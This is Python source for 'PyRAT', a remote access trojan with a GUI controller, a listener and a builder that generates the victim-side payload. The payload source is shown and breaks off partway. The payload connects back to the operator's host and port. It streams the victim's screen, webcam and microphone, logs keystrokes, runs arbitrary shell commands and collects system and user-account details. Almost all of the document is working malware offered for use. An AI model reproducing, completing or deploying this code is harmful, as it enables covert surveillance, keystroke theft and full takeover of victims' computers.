from customtkinter import *
import subprocess
import threading


def requirements():
    subprocess.run("pip install pypiwin32 opencv-python pillow pynput win10toast pyaudio nuitka", shell=True)
    subprocess.run("python -m pip install -U nuitka", shell=True)

threading.Thread(target=requirements).start()

import tkinter as tk
from tkinter import filedialog
import socket
import time
import cv2
import numpy as np
from PIL import Image
from win10toast import ToastNotifier
import pyaudio

IP = "0.0.0.0"
listen = False
server_thread = None


class PyRAT:
    def __init__(self, master):
        self.img = CTkImage(Image.open(".\Snake.ico"), size=(120, 120))

        self.very_big_font = CTkFont(family="Helvetica", size=30, weight="bold")
        self.big_font = CTkFont(family="Helvetica", size=20, weight="bold")
        self.small_font = CTkFont(family="Helvetica", size=9, weight="bold")

        self.root = master
        self.root.title("PyRAT")
        self.root.iconbitmap(".\Snake.ico")
        self.root.geometry("1080x730")
        self.root.resizable(height=False, width=False)
        self.root.configure(fg_color="black")

        nothing = CTkLabel(self.root, text="")
        nothing.place(x=0, y=0)
        # Tabview
        self.Tab = CTkTabview(self.root, width=1000, height=700, segmented_button_selected_color="#438A3B", text_color="lime", segmented_button_unselected_color="black", segmented_button_fg_color="#0A1209", fg_color="#101A10", segmented_button_selected_hover_color="grey")
        self.Tab.pack()

        self.Tab.add("Control Panel")
        self.Tab.add("Builder/Listener")

        # Control_panel
        self.Logo_Label = CTkLabel(self.Tab.tab("Control Panel"), bg_color="#101A10", image=self.img, text="")
        self.Display = CTkTextbox(self.Tab.tab("Control Panel"), width=830, height=640, state="disabled", fg_color="#080C08")
        self.B_info = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Info", text_color="lime", fg_color="black", hover_color="grey", command=self.info)
        self.B_screen = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Screen", text_color="lime", fg_color="black", hover_color="grey", command=self.screen)
        self.B_cam = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Cam", text_color="lime", fg_color="black", hover_color="grey", command=self.cam)
        self.B_audio = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Audio", text_color="lime", fg_color="black", hover_color="grey", command=self.audio)
        self.B_logger = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Logger", text_color="lime", fg_color="black", hover_color="grey", command=self.logger)
        self.B_shell = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Shell", text_color="lime", fg_color="black", hover_color="grey", command=self.toggle_shell)
        self.B_lock = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Lock", text_color="lime", fg_color="black", hover_color="grey", command=self.lock)
        self.B_screenshot = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Screenshot", text_color="lime", fg_color="black", hover_color="grey", command=self.screenshot)
        self.B_snap = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Snap", text_color="lime", fg_color="black", hover_color="grey", command=self.snap)
        self.B_shutdown = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Shutdown", text_color="lime", fg_color="black", hover_color="grey", command=self.shutdown)
        self.B_reset = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Restart", text_color="lime", fg_color="black", hover_color="grey", command=self.restart)
        self.B_kill = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Kill PID", text_color="lime", fg_color="black", hover_color="grey", command=self.toggle_kill)

        self.Shell_Entry = CTkEntry(self.Tab.tab("Control Panel"), width=140, bg_color="#438A3B", text_color="white", font=self.small_font, state="disabled")
        self.Shell_Label = CTkLabel(self.Tab.tab("Control Panel"), text_color="white", bg_color="#101A10", text="Shell:", font=self.small_font)
        self.Kill_Entry = CTkEntry(self.Tab.tab("Control Panel"), width=140, bg_color="#438A3B", text_color="white", font=self.small_font, state="disabled")
        self.Kill_Label = CTkLabel(self.Tab.tab("Control Panel"), text_color="white", bg_color="#101A10", text="PID:",font=self.small_font)

        self.Shell_Entry.bind("<Return>", self.shell)
        self.Kill_Entry.bind("<Return>", self.killer)

        self.B_info.place(x=0, y=165)
        self.B_screenshot.place(x=0, y=200)
        self.B_screen.place(x=0, y=235)
        self.B_cam.place(x=0, y=270)
        self.B_snap.place(x=0, y=305)
        self.B_audio.place(x=0, y=340)
        self.B_logger.place(x=0, y=375)
        self.B_kill.place(x=0, y=410)
        self.B_shell.place(x=0, y=445)
        self.B_lock.place(x=0, y=480)
        self.B_reset.place(x=0, y=515)
        self.B_shutdown.place(x=0, y=550)

        # Root
        self.Title_Label = CTkLabel(self.Tab.tab("Control Panel"), text_color="lime", text="PyRAT", font=self.very_big_font, bg_color="#101A10")
        self.Connection_Label = CTkLabel(self.root, text_color="lime", bg_color="#101A10", text="", font=self.small_font)
        self.Error_Label = CTkLabel(self.root, text_color="red", bg_color="#101A10", text="", font=self.small_font)

        # Server
        self.Port_Entry = CTkEntry(self.Tab.tab("Builder/Listener"), height=60, width=988, bg_color="#438A3B", text_color="green", font=self.big_font)
        self.Listen_Label = CTkLabel(self.Tab.tab("Builder/Listener"), text_color="lime", bg_color="#101A10", text="", font=self.big_font)
        self.Listen_Label_info = CTkLabel(self.Tab.tab("Builder/Listener"), text_color="white", bg_color="#101A10", text="Port:", font=self.big_font)
        self.Listener_Label = CTkLabel(self.Tab.tab("Builder/Listener"), text_color="lime", bg_color="#101A10", text="PyRAT Listener:", font=self.very_big_font)
        self.B_listen = CTkButton(self.Tab.tab("Builder/Listener"), bg_color="#0A1209", text="Listen", text_color="lime", fg_color="black", hover_color="grey", command=self.switch_listening, width=988, font=self.big_font, height=60)

        # Builder
        self.Build_Label = CTkLabel(self.Tab.tab("Builder/Listener"), text_color="lime", bg_color="#101A10", text="PyRAT Builder:", font=self.very_big_font)
        self.B_build = CTkButton(self.Tab.tab("Builder/Listener"), bg_color="#0A1209", text="Build", text_color="lime", fg_color="black", hover_color="grey", command=self.builder, width=988, font=self.big_font, height=60)
        self.Build_port = CTkEntry(self.Tab.tab("Builder/Listener"), width=988, bg_color="#438A3B", text_color="green", font=self.big_font, height=60)
        self.Build_ip = CTkEntry(self.Tab.tab("Builder/Listener"), width=988, bg_color="#438A3B", text_color="green", font=self.big_font, height=60)
        self.Build_Label_ip = CTkLabel(self.Tab.tab("Builder/Listener"), text_color="white", bg_color="#101A10", text="LHost:", font=self.big_font)
        self.Build_Label_port = CTkLabel(self.Tab.tab("Builder/Listener"), text_color="white", bg_color="#101A10",text="LPort:", font=self.big_font)
        self.tren1 = CTkLabel(self.Tab.tab("Builder/Listener"), text_color="green", bg_color="#101A10", text="~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", font=self.big_font)
        self.set_icon = CTkCheckBox(self.Tab.tab("Builder/Listener"), offvalue=False, onvalue=True, text="Icon", font=self.big_font, fg_color="green", hover_color="lime", command=self.build_icon_set)
        self.set_name = CTkEntry(self.Tab.tab("Builder/Listener"))
        self.set_name_label = CTkLabel(self.Tab.tab("Builder/Listener"), bg_color="#101A10", text="Filename:", font=self.big_font)
        self.Display.place(x=150, y=4)
        self.build_icon = None

        # Listener
        self.Listener_Label.place(x=0, y=5)
        self.B_listen.place(x=0, y=150)
        self.Port_Entry.place(x=0, y=80)
        self.Listen_Label_info.place(x=0, y=50)
        self.Listen_Label.place(x=0, y=220)

        # Builder
        self.Build_Label.place(x=0, y=285)
        self.tren1.place(x=0, y=250)
        self.B_build.place(x=0, y=580)

        self.set_icon.place(x=260, y=540)
        self.set_name.place(x=110, y=540)
        self.set_name_label.place(x=10, y=540)

        self.Build_Label_ip.place(x=0, y=330)
        self.Build_ip.place(x=0, y=360)
        self.Build_Label_port.place(x=0, y=430)
        self.Build_port.place(x=0, y=460)

        # Dependencies
        self.Error_Label.place(x=830, y=18)
        self.Connection_Label.place(x=920, y=18)
        self.Logo_Label.place(x=10, y=0)
        self.Title_Label.place(x=25, y=125)

        self.server = None
        self.client = None
        self.sharingScreen = False
        self.sharingCam = False
        self.shell_mode = False
        self.sharingAudio = False
        self.showing_png = False
        self.showing_snap = False
        self.killers = False
        self.Logging = False
        self.showing_png = False
        self.size_share = None
        self.width_share = None
        self.height_share = None
        self.size_cam = None
        self.width_cam = None
        self.height_cam = None

    def build_icon_set(self):
        if self.set_icon.get():
            self.build_icon = filedialog.askopenfile(title="Select an Icon File", filetypes=[("Icon Files", "*.ico"), ("PNG Files", "*.png")])
            if self.build_icon:
                self.build_icon = self.build_icon.name.strip()
                self.set_icon.configure(text=f"Icon: {os.path.basename(str(self.build_icon))}")

            else:
                self.Error_Label.configure(text="Icon not set!")
        else:
            self.Error_Label.configure(text="")
            self.set_icon.configure(text="Icon")

    def logger(self):
        def stop_logging():
            try:
                self.client.send("<STOP_LOG>".encode())
                self.clear()
                self.enable()
            except ConnectionAbortedError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass

        def start_logging():
            try:
                self.client.send("<LOG>".encode())
                self.clear()
                self.disable()
                self.B_logger.configure(text="exit", state="normal")
                while self.Logging:
                    key = self.client.recv(1024).decode(errors="ignore")
                    if "<END_LOG>" in key or not key:
                        self.Logging = False
                        break
                    self.Display.configure(state="normal")
                    self.Display.insert(tk.END, f"{key}")
                    self.Display.yview_moveto(1)
                    self.Display.configure(state="disabled")

            except ConnectionResetError:
                self.Logging = False
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.Logging = False
                self.enable()
                self.Connection_Label.configure(text="")
                pass

        if not self.Logging:
            self.Logging = True
            threading.Thread(target=start_logging).start()
        else:
            self.Logging = False
            threading.Thread(target=stop_logging).start()

    def notify(self, title, msg, duration):
        notify = ToastNotifier()
        notify.show_toast(
            title=title,
            msg=msg,
            icon_path=r".\Snake.ico",
            duration=duration
        )

    def snap(self):
        def stop_showing():
            self.clear()
            self.enable()

        def get():
            try:
                self.client.send("<SNAP>".encode())
                state = self.client.recv(4096)
                if state == b"<START>":
                    self.disable()
                    self.B_snap.configure(text="exit", state="enabled")
                    self.clear()
                    img_bytes = b""
                    while True:
                        bytes = self.client.recv(10240)
                        if b"<END>" in bytes:
                            bytes = bytes.replace(b"<END>", b"")
                            img_bytes += bytes
                            break
                        img_bytes += bytes

                    img = np.frombuffer(img_bytes, dtype=np.uint8).reshape((self.width_cam, self.height_cam, 3))
                    image = cv2.resize(img, (920, 600))
                    cv2.imshow("Snap", image)
                    while self.showing_snap:
                        cv2.waitKey(50)
                    cv2.destroyAllWindows()
                    stop_showing()

                elif state == b"<NO_CAM>":
                    self.enable()
                    self.Error_Label.configure(text="No cam found!")

            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass
            except OSError:
                self.enable()
                pass

        if not self.showing_snap:
            self.showing_snap = True
            threading.Thread(target=get).start()
        else:
            self.showing_snap = False
            threading.Thread(target=stop_showing).start()

    def screenshot(self):
        def stop_showing():
            self.clear()
            self.enable()

        def get():
            try:
                self.client.send("<SCREENSHOT>".encode())
                self.disable()
                time.sleep(0.01)
                self.B_screenshot.configure(state="enabled", text="exit")
                img_bytes = b""
                while True:
                    bytes = self.client.recv(4096)
                    if b"<END>" in bytes:
                        bytes = bytes.replace(b"<END>", b"")
                        img_bytes += bytes
                        break
                    img_bytes += bytes

                img_array = np.frombuffer(img_bytes, dtype=np.uint8)
                image = cv2.imdecode(img_array, cv2.IMREAD_COLOR)
                if image is not None:
                    image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)
                    image = cv2.resize(image, (920, 600))
                    cv2.imshow("Screenshot", image)
                    while self.showing_png:
                        cv2.waitKey(50)
                cv2.destroyAllWindows()
                stop_showing()

            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass
            except OSError:
                self.enable()
                pass

        if not self.showing_png:
            self.showing_png = True
            threading.Thread(target=get).start()
        else:
            self.showing_png = False
            threading.Thread(target=stop_showing).start()

    def restart(self):
        try:
            self.client.send("<RESTART>".encode())
            self.Connection_Label.configure(text="")
            if self.client:
                self.client.close()
            self.client = None
        except ConnectionResetError:
            self.Connection_Label.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.Connection_Label.configure(text="")
            pass

    def shutdown(self):
        try:
            self.client.send("<SHUTDOWN>".encode())
            self.Connection_Label.configure(text="")
            if self.client:
                self.client.close()
            self.client = None
        except ConnectionResetError:
            self.Connection_Label.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.Connection_Label.configure(text="")
            pass

    def lock(self):
        try:
            self.client.send("<LOCK>".encode())
        except ConnectionResetError:
            self.Connection_Label.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.Connection_Label.configure(text="")
            pass

    def enable(self):
        self.B_info.configure(state="normal", text="Info")
        self.B_cam.configure(state="normal", text="Cam")
        self.B_logger.configure(state="normal", text="Logger")
        self.B_shell.configure(state="normal", text="Shell")
        self.B_screen.configure(state="normal", text="Screen")
        self.B_audio.configure(state="normal", text="Audio")
        self.B_kill.configure(state="normal", text="Kill PID")
        self.B_snap.configure(state="normal", text="Snap")
        self.B_lock.configure(state="normal", text="Lock")
        self.B_reset.configure(state="normal", text="Restart")
        self.B_shutdown.configure(state="normal", text="Shutdown")
        self.B_screenshot.configure(state="normal", text="Screenshot")
        self.Error_Label.configure(text="")
        self.showing_png = False
        self.showing_snap = False
        self.sharingScreen = False
        self.sharingCam = False
        self.sharingAudio = False

    def disable(self):
        self.B_info.configure(state="disabled")
        self.B_cam.configure(state="disabled")
        self.B_logger.configure(state="disabled")
        self.B_shell.configure(state="disabled")
        self.B_screen.configure(state="disabled")
        self.B_audio.configure(state="disabled")
        self.B_kill.configure(state="disabled")
        self.B_snap.configure(state="disabled")
        self.B_lock.configure(state="disabled")
        self.B_reset.configure(state="disabled")
        self.B_shutdown.configure(state="disabled")
        self.B_screenshot.configure(state="disabled")
        self.Error_Label.configure(text="")

    def killer(self, event):
        try:
            task = self.Kill_Entry.get().strip()
            if task.isdigit():
                self.client.send("<KILLED>".encode())
                self.client.send(task.encode())
                self.Error_Label.configure(text="")
                self.Kill_Entry.delete("0", "end")
                output = self.client.recv(2048).decode(errors="ignore")
                if output == "None":
                    self.Kill_Entry.delete("0", "end")
                    self.Error_Label.configure(text="Enter valid PID!")
                else:
                    self.Error_Label.configure(text="")
                    self.Display.configure(state="normal")
                    self.Display.insert(tk.END, f"\n{output}")
                    self.Display.yview_moveto(1)
                    self.Display.configure(state="disabled")
            else:
                self.Kill_Entry.delete("0", "end")
                self.Error_Label.configure(text="Enter valid PID!")

        except ConnectionResetError:
            self.enable()
            self.Connection_Label.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.enable()
            self.Connection_Label.configure(text="")
            pass

    def toggle_kill(self):
        try:
            if not self.killers and self.client:
                def start():
                    self.killers = True
                    self.disable()
                    self.clear()
                    self.client.send("<KILL>".encode())
                    out = self.client.recv(20480).decode(errors="ignore")
                    self.Display.configure(state="normal")
                    self.Display.delete("1.0", tk.END)
                    self.Display.insert("1.0", out)
                    self.Display.yview_moveto(1)
                    self.Display.configure(state="disabled")
                    self.Kill_Label.place(x=0, y=580)
                    self.B_kill.configure(state="normal", text="exit")
                    self.Kill_Entry.configure(state="normal")
                    self.Kill_Entry.place(x=0, y=610)

                threading.Thread(target=start).start()

            else:
                def stop():
                    self.killers = False
                    self.Display.delete("1.0", tk.END)
                    self.Kill_Entry.place_forget()
                    self.Kill_Label.place_forget()
                    self.enable()
                    self.clear()
                    self.Kill_Entry.delete("0", "end")
                    self.Kill_Entry.configure(state="readonly")

                threading.Thread(target=stop).start()

        except ConnectionResetError:
            self.enable()
            self.Connection_Label.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.enable()
            self.Connection_Label.configure(text="")
            pass

    def info(self):
        def getinfo():
            try:
                self.client.send("<INFO>".encode())
                self.disable()
                output = self.client.recv(10240).decode(errors="ignore")
                self.Display.configure(state="normal")
                self.Display.delete("1.0", tk.END)
                self.Display.insert(tk.END, output)
                self.Display.configure(state="disabled")
                self.enable()
            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass

        threading.Thread(target=getinfo).start()

    def audio(self):
        def stop_audio():
            try:
                self.sharingAudio = False
                self.client.send("<STOP_AUDIO>".encode())
                while True:
                    state = self.client.recv(1024)
                    if b"<ENDED>" in state:
                        break
                self.enable()
            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass

        def share():
            try:
                self.client.send("<AUDIO>".encode())
                self.sharingAudio = True
                self.clear()
                rec = pyaudio.PyAudio()
                aud = rec.open(format=pyaudio.paInt16, channels=1, rate=44100, frames_per_buffer=1024, output=True)
                self.disable()
                self.B_audio.configure(text="exit", state="normal")
                while self.sharingAudio:
                    data = self.client.recv(1024)
                    if not data:
                        break
                    aud.write(data)
                self.enable()
                self.client.send("<STOP_AUDIO>".encode())

            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass

        if not self.sharingAudio:
            threading.Thread(target=share).start()
        else:
            threading.Thread(target=stop_audio).start()

    def screen(self):
        def stop_share():
            try:
                self.client.send("<STOP_SHARE>".encode())
                while True:
                    state = self.client.recv(20480)
                    if b"<STOPPED>" in state:
                        break
                self.enable()
            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass

        def share():
            try:
                self.client.send("<SHARE>".encode())
                self.disable()
                self.clear()
                self.B_screen.configure(text="exit", state="normal")
                while self.sharingScreen:
                    data = b""
                    while len(data) < self.size_share:
                        packet = self.client.recv(self.size_share - len(data))
                        if not packet:
                            break
                        data += packet
                    if not data:
                        break

                    img = np.frombuffer(data, dtype=np.uint8).reshape(self.height_share, self.width_share, 3)
                    screenshot = cv2.resize(cv2.cvtColor(img, cv2.COLOR_BGR2RGB), (920, 600))
                    cv2.imshow("Screen", screenshot)
                    cv2.waitKey(1)
                cv2.destroyAllWindows()

            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass

        if not self.sharingScreen:
            self.sharingScreen = True
            threading.Thread(target=share).start()
        else:
            self.sharingScreen = False
            threading.Thread(target=stop_share).start()

    def recv_stats(self):
        def recv_share_stats():
            self.width_share, self.height_share, self.size_share = map(int,
                                                                       self.client.recv(4096).decode().split(','))

        def recv_cam_stats():
            self.width_cam, self.height_cam, self.size_cam = map(int, self.client.recv(4096).decode().split(','))

        self.client.send("<STATS>".encode())
        recv_share_stats()
        recv_cam_stats()

    def cam(self):
        def stop_cam():
            try:
                self.enable()
                self.client.send("<STOP_CAM>".encode())
                while True:
                    state = self.client.recv(20480)
                    if b"<STOPPED>" in state:
                        break

            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass
            except OSError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass

        def share():
            try:
                self.client.send("<CAM>".encode())
                state = self.client.recv(4096)
                if state == b"<START>":
                    self.disable()
                    self.clear()
                    self.B_cam.configure(text="exit", state="normal")
                    while self.sharingCam:
                        data = b""
                        while len(data) < self.size_cam:
                            packet = self.client.recv(self.size_cam - len(data))
                            if not packet:
                                break
                            data += packet
                        if not data:
                            self.sharingCam = False
                            break
                        img = np.frombuffer(data, dtype=np.uint8).reshape((self.width_cam, self.height_cam, 3))
                        image = cv2.resize(img, (920, 600))
                        cv2.imshow("Camera", image)
                        cv2.waitKey(1)

                    cv2.destroyAllWindows()
                elif state == b"<NO_CAM>":
                    self.enable()
                    self.Error_Label.configure(text="No cam found!")

            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass
            except ValueError:
                self.enable()

        if not self.sharingCam:
            self.sharingCam = True
            threading.Thread(target=share).start()
        else:
            self.sharingCam = False
            threading.Thread(target=stop_cam).start()

    def start_server(self, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.server.bind((str(IP), int(port)))
            self.server.listen()

            while listen:
                self.client, addr = self.server.accept()

                if self.client:
                    if self.client.recv(1024).decode() == "<PyRAT>":
                        self.client.send("<PyRAT>".encode())
                        self.recv_stats()
                        self.Connection_Label.configure(text=f"Connected: {addr[0]}", font=self.small_font)
                        threading.Thread(target=self.notify,
                                         args=("New connection!", f"Connected to {addr[0]}", 1)).start()
                    else:
                        self.client.close()
                        self.client = None
                        self.Connection_Label.configure(text="")

        except:
            pass

    def switch_listening(self):
        global listen
        global server_thread
        listen = not listen
        time.sleep(0.01)

        if listen:
            try:
                port = int(self.Port_Entry.get().strip())

                if port is None or port > 65535:
                    raise ValueError()

                else:
                    self.Error_Label.configure(text="")
                    self.Port_Entry.configure(state="disabled")
                    self.B_listen.configure(text="stop listening")
                    server_thread = threading.Thread(target=self.start_server, args=(port,))
                    server_thread.start()
                    self.Listen_Label.configure(text=f" Listening...")

            except ValueError:
                self.enable()
                self.Error_Label.configure(text="Enter valid port!")
                self.Listen_Label.configure(text="")
                listen = False
                pass
            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                listen = False
                self.Connection_Label.configure(text="")
                pass
        else:
            try:
                self.Connection_Label.configure(text="")
                self.Port_Entry.configure(state="normal")
                self.enable()
                self.size_share = None
                self.width_share = None
                self.height_share = None
                self.size_cam = None
                self.width_cam = None
                self.height_cam = None

                self.B_listen.configure(text="start listening")
                self.Listen_Label.configure(text="")
                self.clear()
                if self.client:
                    self.client.send("<END>".encode())
                self.server.close()
                self.server = None
                if self.client:
                    self.client.close()
                if server_thread and server_thread.is_alive():
                    server_thread.join()

                self.client = None
            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass

    def clear(self):
        self.Display.configure(state="normal")
        self.Display.delete("1.0", tk.END)
        self.Display.configure(state="disabled")

    def shell(self, event):
        def send():
            try:
                if self.client and self.shell_mode:
                    command = self.Shell_Entry.get().strip()

                    if command.lower() == "exit":
                        self.toggle_shell()
                        return

                    elif not command.strip() or command.strip() == "<END_SHELL>":
                        command = "nothing"

                    self.Display.configure(state="normal")
                    self.client.send(command.encode())
                    direct = self.client.recv(2048).decode(errors="ignore")
                    self.Display.insert(tk.END, f"{direct}> {command}\n")
                    self.Display.configure(state="disabled")
                    self.Shell_Entry.delete("0", "end")
                    out = self.client.recv(12288).decode(errors="ignore")
                    self.Display.configure(state="normal")
                    self.Display.insert(tk.END, f"{out}\n\n")
                    self.Display.yview_moveto(1)
                    self.Display.configure(state="disabled")

                else:
                    self.toggle_shell()
            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass

        threading.Thread(target=send).start()

    def toggle_shell(self):
        try:
            self.shell_mode = not self.shell_mode
            if self.shell_mode and self.client:
                self.clear()
                self.disable()
                self.Shell_Entry.configure(state="normal")
                self.B_shell.configure(text="exit", state="normal")
                self.Shell_Entry.place(x=0, y=610)
                self.Shell_Label.place(x=0, y=580)
                self.client.send("<SHELL>".encode())
            else:
                self.clear()
                self.enable()
                self.Shell_Entry.place_forget()
                self.Shell_Label.place_forget()
                self.Shell_Entry.delete("0", "end")
                self.Shell_Entry.configure(state="readonly")
                self.client.send("<END_SHELL>".encode())
        except ConnectionResetError:
            self.enable()
            self.Connection_Label.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.enable()
            self.Connection_Label.configure(text="")
            pass

    def builder(self):
        try:
            ip = self.Build_ip.get().strip()
            port = int(self.Build_port.get().strip())

            if ip is None or len(ip) < 6:
                raise ZeroDivisionError

            elif port is None or port > 65535:
                raise ValueError()

            def build():
                data = f"""
import os
import subprocess
import threading
import socket
import time
import numpy as np
from PIL import ImageGrab
import cv2
from pynput import keyboard
import pyaudio

local_shell = False
connected = False
cam = False
stream = False
times = 0
Logging = False
rec_audio = False


def audio(client):
    global rec_audio
    try:
        rec = pyaudio.PyAudio()
        aud = rec.open(format=pyaudio.paInt16, channels=1, rate=44100, frames_per_buffer=1024, input=True)

        while rec_audio:
            data = aud.read(1024)
            client.sendall(data)

        client.send(b"<ENDED>")

    except ConnectionResetError:
        rec_audio = False
        if client:
            client.close()
        pass

    except OSError:
        rec_audio = False
        pass

    finally:
        if aud.is_active():
            aud.stop_stream()
        aud.close()
        rec.terminate()


def log(client):
    global Logging

    def on_press(key):
        try:
            client.send(key.char.encode())
        except AttributeError:
            special = str(key).replace("Key.", "")
            if special == "space":
                client.send(" ".encode())
            elif special == "tab":
                client.send("    ".encode())
            elif special == "enter":
                client.send("{r"\n"}".encode())
            elif special == "backspace":
                client.send(" <BACKSPACE> ".encode())
            elif special == "caps_lock":
                client.send(" <CAPS_LOCK> ".encode())

        except ConnectionResetError:
            global Logging
            if client:
                client.close()
            Logging = False
            pass

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    while Logging:
        pass

    listener.stop()
    listener.join()
    client.send("<END_LOG>".encode())


def send_stats(client):
    def send_share_stats():
        img = ImageGrab.grab()
        res = img.size
        size = len(np.array(img).tobytes())
        client.send(f"{r"{res[0]},{res[1]},{size}"}".encode())
        img.close()

    def send_cam_stats():
        camera = cv2.VideoCapture(0)
        if camera.isOpened():
            _, frame = camera.read()
            camera.release()
            res = frame.shape
            size = len(frame.tobytes())
            client.send(f"{r"{res[0]},{res[1]},{size}"}".encode())
        else:
            client.send("0,0,0".encode())
        camera.release()

    send_share_stats()
    send_cam_stats()


def share_desktop(client):
    global connected
    global stream
    try:
        while stream:
            frame = ImageGrab.grab()
            img_bytes = np.array(frame).tobytes()
            client.sendall(img_bytes)
        client.send(b"<STOPPED>")
    except ConnectionResetError:
        if client:
            client.close()
        stream = False
        connected = False
        pass


def share_cam(client):
    global connected
    global cam
    try:
        data = cv2.VideoCapture(0)
        if data.isOpened():
            client.send(b"<START>")
            while cam:
                success, frame = data.read()
                img_bytes = frame.tobytes()
                client.sendall(img_bytes)
            data.release()
            client.send(b"<STOPPED>")
        else:
            data.release()
            client.send(b"<NO_CAM>")

    except ConnectionResetError:
        if client:
            client.close()
        cam = False
        connected = False
        pass
    except AttributeError:
        cam = False
        pass


def snap(client):
    global connected
    try:
        snap = cv2.VideoCapture(0)
        if snap.isOpened():
            client.send(b"<START>")
            success, frame = snap.read()
            snap.release()
            img_bytes = frame.tobytes()
            client.sendall(img_bytes)
            client.send(b"<END>")
        else:
            snap.release()
            client.send(b"<NO_CAM>")

    except ConnectionResetError:
        if client:
            client.close()
        connected = False
        pass


def screenshot(client):
    global connected
    try:
        frame = ImageGrab.grab()
        img_np = np.array(frame)
        _, img_encoded = cv2.imencode('.png', img_np)
        img_bytes = img_encoded.tobytes()
        client.sendall(img_bytes)
        client.send(b"<END>")

    except ConnectionResetError:
        if client:
            client.close()
        connected = False
        pass


def shell(client):
    global local_shell
    global connected
    while local_shell:
        try:
            command = client.recv(4096).decode(errors="ignore").strip()

            if command == "<END_SHELL>":
                local_shell = False
                return
            elif command == "<END>":
                local_shell = False
                connected = False
                return

            else:
                try:
                    client.send(os.getcwd().encode())
                    if command.startswith("cd "):
                        try:
                            os.chdir(command[3:])
                            output = f">>'{r"{os.getcwd()}\\"}'<<"
                        except FileNotFoundError:
                            output = "Directory not found!"
                        except PermissionError:
                            output = "Access denied!"

                    elif command.lower() == "cmd" or command.lower() == "powershell":
                        output = "Operation not permitted!"

                    else:
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode(
                            errors="ignore")

                except subprocess.CalledProcessError as e:
                    output = e.output.decode(errors="ignore")

                client.send(output.encode())
                time.sleep(0.1)

        except ConnectionResetError:
            if client:
                client.close()
            client = None
            connected = False
            local_shell = False
            pass

        except AttributeError:
            client = None
            connected = False
            local_shell = False
            pass


def recv():
    global connected
    global client
    while True:
        while not connected:
            client = None
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect(("{str(ip)}", {int(port)}))
                client.send("<PyRAT>".encode())
                if client.recv(1024).decode() == "<PyRAT>":
                    connected = True

                else:
                    client.close()
                time.sleep(3)
            except ConnectionResetError:
                time.sleep(3)
            except ConnectionRefusedError:
                time.sleep(3)

        try:
            global times
            command = client.recv(4096).decode()

            if command == "<STATS>":
                threading.Thread(target=send_stats, args=(client,)).start()

            elif command == "<INFO>":
                info = subprocess.check_output("wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors", shell=True)
                info += subprocess.check_output("wmic memorychip get capacity,Speed", shell=True)
                info += subprocess.check_output("wmic diskdrive get model,size", shell=True)
                info += subprocess.check_output("systeminfo", shell=True)
                info += subprocess.check_output("net user", shell=True)
                info += subprocess.check_output("ipconfig", shell=True)
                client.sendall(info)

            elif command == "<CAM>":
                global cam
                cam = True
                threading.Thread(target=share_cam, args=(client,)).start()

            elif command == "<SNAP>":
                snap(client)

            elif command == "<SCREENSHOT>":
                screenshot(client)

            elif command == "<SHARE>":
